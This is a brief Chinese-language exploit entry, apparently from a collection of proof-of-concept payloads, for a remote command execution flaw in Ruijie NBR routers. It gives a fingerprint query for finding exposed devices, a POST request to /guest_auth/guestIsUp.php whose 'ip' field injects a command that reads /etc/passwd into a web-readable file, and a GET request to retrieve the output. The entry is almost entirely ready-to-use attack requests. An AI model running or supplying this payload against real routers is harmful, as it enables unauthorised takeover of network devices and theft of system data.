# 锐捷NBR路由器guestIsUp.php远程命令执行漏洞

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="Ruijie-NBR路由器"`
- **请求**：`POST /guest_auth/guestIsUp.php HTTP/1.1`

**请求体 / payload**
```
1.执行查看用户并写入当前目录test.txt的poc
Host:
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
mac=1&ip=127.0.0.1cat /etc/passwd > test.txt
2.访问该文件，得到回显
GET /guest_auth/test.txt HTTP/1.1
Host: {{Hostname}}
若有收获，就点个赞吧
>
```

**其他**
- 版本: Ruijie-NBR路由器